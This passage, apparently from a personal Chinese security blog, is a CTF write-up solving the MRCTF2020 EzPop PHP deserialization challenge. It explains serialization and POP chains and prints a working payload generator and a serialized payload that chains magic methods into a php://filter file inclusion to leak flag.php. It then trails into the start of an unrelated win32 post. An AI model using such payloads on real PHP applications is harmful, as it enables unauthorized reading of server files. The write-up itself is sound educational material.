<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:10:&quot;LinkedNode&quot;:2:&#123;</span><br><span class="line">	s:17:&quot;LinkedNodevalue&quot;;&lt;类型&gt;:&lt;值&gt;;s:16:&quot;LinkedNodenext&quot;:</span><br><span class="line">		下一个LinkedNode实例;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考虑如图所示结构,应怎么用序列化表示呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">subgraph linkedlist</span><br><span class="line">	head--&gt;A--&gt;510--&gt;C--&gt;empire--&gt;10--&gt;NULL</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">10</span>:<span class="string">&quot;LinkedList&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">16</span>:<span class="string">&quot;LinkedListhead&quot;</span>;</span><br><span class="line">    O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;i:<span class="number">0</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;</span><br><span class="line">        O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;</span><br><span class="line">        	O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;i:<span class="number">510</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;</span><br><span class="line">        		O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;</span><br><span class="line">        			O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;empire&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;</span><br><span class="line">           				O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;i:<span class="number">10</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;N;&#125;</span><br><span class="line">           			&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="pop链">POP链</h2>
<p>多次利用反序列化漏洞,可能要反序列化得到多个对象,最终找到可利用点</p>
<p>类似于pwn中的面向返回编程</p>
<h3 id="mrctf2020-ezpop"><a
target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BMRCTF2020%5DEzpop">MRCTF2020-EzPop</a></h3>
<p>上来就给源码,显然是<code>highlight_file(__FILE__);</code>的功劳</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;<span class="comment">//普通成员函数</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">//append有文件包含,value参数应该是一个文件,显然这里应该是flag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;<span class="comment">//本类对象被当作函数调用的时候自动调用__invoke</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);<span class="comment">//本类成员作为仿函数被调用时,调用append(var),那么var应该是&quot;flag.php&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//分析到此,Modifier类的作用大体上是:</span></span><br><span class="line"><span class="comment">//本类对象应当作为其他类对象的成员对象,并且$var应该设置为flag.php,然后等待被别人调用__invoke得到flag</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;<span class="comment">//缺省参数</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">//unserialize先调用__wakeup,显然本类应该是 反序列化突破口</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;<span class="comment">//访问不存在的属性或者protected,private属性时,自动调用__get</span></span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">//给源码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>整个调用链是怎样的呢?</p>
<p>从Show类入口,观察其<code>__wakeup</code>函数,貌似做了一个黑名单过滤,不允许<code>__$this-&gt;source</code>有黑名单中的字样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">//unserialize先调用__wakeup,显然本类应该是 反序列化突破口</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是,<code>$this-&gt;source</code>一定是一个字符串吗?如果是一个实现了<code>__toString</code>魔术函数的对象也可以啊.</p>
<p>这三个类只有Show实现了<code>__toString</code>,因此<code>$source</code>应该是一个<code>Show</code>类的对象</p>
<p>现在皮球从<code>Show::__wakeup</code>踢到了<code>Show::__toString</code>脚下</p>
<p>Show类的<code>__toString</code>干了啥呢?</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>str如果是一个字符串,对他应用成员运算符<code>-&gt;</code>必然出错,</p>
<p>但是如果str不是字符串,是一个对象呢?</p>
<p>是谁的对象呢?从<code>str-&gt;source</code>,直觉上还是Show的对象,但是这样转起来没完了,一直在Show里面没有进展</p>
<p>那么str应该是谁的对象呢?</p>
<p>考虑到<code>Test::__get</code>这个函数,当调用<code>Test</code>类中不存在的成员时,<code>__get</code>函数会被调用</p>
<p>而<code>Test</code>不含这个叫做<code>source</code>的成员,因此皮球可以踢给<code>Test::__get</code></p>
<p><code>Test</code>类的<code>__get</code>干了啥呢?</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;<span class="comment">//访问不存在的属性或者protected,private属性时,自动调用__get</span></span><br><span class="line">    <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用一个<code>$function</code>变量拷贝了本对象的p成员,然后作为函数调用</p>
<p>那么本类的<code>p</code>成员要么是一个函数,要么是一个实现了<code>__invoke</code>的仿函数类,显然<code>Modifier</code>类实现了<code>__invoke</code>函数</p>
<p>皮球踢到了<code>Modifier::__invoke</code>脚下,它干了啥呢?</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;<span class="comment">//普通成员函数</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">//append有文件包含,value参数应该是一个文件,显然这里应该是flag.php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;<span class="comment">//本类对象被当作函数调用的时候自动调用__invoke</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);<span class="comment">//本类成员作为仿函数被调用时,调用append(var),那么var应该是&quot;flag.php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>__invoke</code>调用了<code>append($this-&gt;var)</code>,将<code>$var</code>文件包含进来</p>
<p>控制流分析完毕,下面考虑如何构造序列化字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Show对象,用于骗过Show::__wakeup</span><br><span class="line">	source:Show对象,用于执行Show::__toString</span><br><span class="line">				source:随便</span><br><span class="line">				str:Test对象,用于执行__get</span><br><span class="line">						p:Modifier对象,用于执行__invoke</span><br><span class="line">								var:&quot;flag.php&quot;//此处有问题,直接写flag.php得不到flag</span><br><span class="line">	str:随便</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因此生成payload的php程序如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<span class="comment">//获取源代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;source=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str=<span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> <span class="title class_">Modifier</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;source&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;source&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;Modifier&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot; * var&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;&#125;&#125;&#125;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<p>urlencode之后用get方法传进去得到base64加密密文</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFne2UzY2IyY2U2LTZlNzItNDVjNy1iY2FlLWRlMTk4YmM2ZjkzYX0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+</span><br></pre></td></tr></table></figure>
<p>解密之后得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>= <span class="string">&quot;flag&#123;e3cb2ce6-6e72-45c7-bcae-de198bc6f93a&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Help Me Find FLAG!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="坑1">坑1</h4>
<p>我一开始傻了吧唧的真用手去构造这个序列化字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Showsource&quot;</span>;</span><br><span class="line">    O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Showsource&quot;</span>:i:<span class="number">0</span>;</span><br><span class="line">        O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Tests&quot;</span>;</span><br><span class="line">            O:<span class="number">8</span>:<span class="string">&quot;Modifier&quot;</span>:<span class="number">1</span>&#123;s:<span class="number">11</span>:<span class="string">&quot;Modifiervar&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">s:<span class="number">7</span>:<span class="string">&quot;Showstr&quot;</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Showsource&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Showsource&quot;</span>:i:<span class="number">0</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Tests&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;Modifier&quot;</span>:<span class="number">1</span>&#123;s:<span class="number">11</span>:<span class="string">&quot;Modifiervar&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>&#125;&#125;&#125;</span><br><span class="line">s:<span class="number">7</span>:<span class="string">&quot;Showstr&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>结果全错了,键名都不对,只有private修饰的键名才会前面附上类名,啥意思呢?</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$v1</span>=<span class="string">&quot;private&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$v2</span>=<span class="string">&quot;protected&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$v3</span>=<span class="string">&quot;default&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v4</span>=<span class="string">&quot;public&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:4:&#123;s:8:&quot;Testv1&quot;;s:7:&quot;private&quot;;s:5:&quot; * v2&quot;;s:9:&quot;protected&quot;;s:2:&quot;v3&quot;;s:7:&quot;default&quot;;s:2:&quot;v4&quot;;s:6:&quot;public&quot;;&#125;</span><br></pre></td></tr></table></figure>
<table>
<colgroup>
<col style="width: 13%" />
<col style="width: 9%" />
<col style="width: 18%" />
<col style="width: 59%" />
</colgroup>
<thead>
<tr>
<th>修饰符</th>
<th>原键名</th>
<th>序列化后键名</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>private</td>
<td><code>v1</code></td>
<td><code>Testv1</code></td>
<td>附上类名作为前缀</td>
</tr>
<tr>
<td>protected</td>
<td><code>v2</code></td>
<td><code>* v2</code></td>
<td>附上<code>*</code>前缀(注意星号左右各有一个空格)</td>
</tr>
<tr>
<td>缺省</td>
<td><code>v3</code></td>
<td><code>v3</code></td>
<td>不变</td>
</tr>
<tr>
<td>public</td>
<td><code>v4</code></td>
<td><code>v4</code></td>
<td>不变</td>
</tr>
</tbody>
</table>
<h4 id="坑2">坑2</h4>
<p>vscode调试控制台向外粘贴出错</p>
<p>vscode调试控制台输出的运行结果是这样的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220721032806113.png"
alt="image-20220721032806113" />
<figcaption aria-hidden="true">image-20220721032806113</figcaption>
</figure>
<p>对于 *
v2这种protected变量序列化后的键名,从调试控制台复制出去之后,星号两侧的空格消失</p>
<table>
<colgroup>
<col style="width: 23%" />
<col style="width: 76%" />
</colgroup>
<thead>
<tr>
<th>位置</th>
<th>表现</th>
</tr>
</thead>
<tbody>
<tr>
<td>调试控制台中的输出</td>
<td>O:4:"Test":4:{s:8:"Testv1";s:7:"private";s:5:" *
v2";s:9:"protected";s:2:"v3";s:7:"default";s:2:"v4";s:6:"public";}</td>
</tr>
<tr>
<td>粘贴出去的输出</td>
<td>O:4:"Test":4:{s:8:"Testv1";s:7:"private";s:5:"*v2";s:9:"protected";s:2:"v3";s:7:"default";s:2:"v4";s:6:"public";}</td>
</tr>
</tbody>
</table>
<p>解决方法是,直接让php输入urlencode之后的负载,这样所有的空格都会被转移,并且不用再去hackbar中urlencode了</p>
<p><code>echo urlencode(serialize($a));</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/07/15/win32%E7%BC%96%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/15/win32%E7%BC%96%E7%A8%8B/" class="post-title-link" itemprop="url">win32程序设计-chapter3 窗口与消息</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-07-15 00:38:00" itemprop="dateCreated datePublished" datetime="2022-07-15T00:38:00+08:00">2022-07-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-08-31 15:13:07" itemprop="dateModified" datetime="2022-08-31T15:13:07+08:00">2022-08-31</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="windows-sdk-chapter-3-窗口与消息">windows SDK chapter 3
窗口与消息</h1>
<h2 id="从例程开始">从例程开始</h2>
<p>圣经windows程序设计给出的例程:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 